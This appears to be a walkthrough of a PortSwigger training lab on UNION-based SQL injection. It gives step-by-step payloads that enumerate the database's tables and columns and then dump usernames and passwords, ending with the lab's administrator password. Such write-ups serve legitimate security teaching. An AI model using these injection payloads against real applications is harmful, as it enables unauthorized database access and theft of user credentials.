This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

#### Hint

You can find some useful payloads on our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

first we need to know number of column 

![](https://cdn-images-1.medium.com/max/1000/1*3lx60c2eVQrA72RqjznKSQ.png)

there are two column 

now we need to know names of tables from information_schema.tables so we will use 

'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--

i think this is table what we need 

![](https://cdn-images-1.medium.com/max/1000/1*y2yzN8GP7tD5wUtZFQRP8Q.png)

table for users and passwords : users_aniprt

know we need to know names of columns from information_schema.columns so we will use 

'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_aniprt'--

and we found :

![](https://cdn-images-1.medium.com/max/1000/1*xOk7_Ndu6CrLww0bKTNUAA.png)

column for users : username_qudwsf

column for passwords : password_ewlbjp

'+UNION+SELECT+username_qudwsf,+password_ewlbjp+FROM+users_aniprt--

![](https://cdn-images-1.medium.com/max/1000/1*gs6KFIs4sA5I1c8lqy1c8w.png)

username : administrator

password : xqn7vsg7asswch5ti51v

![](https://cdn-images-1.medium.com/max/1000/1*sJyXt3emQy1trop4qK-nzA.png)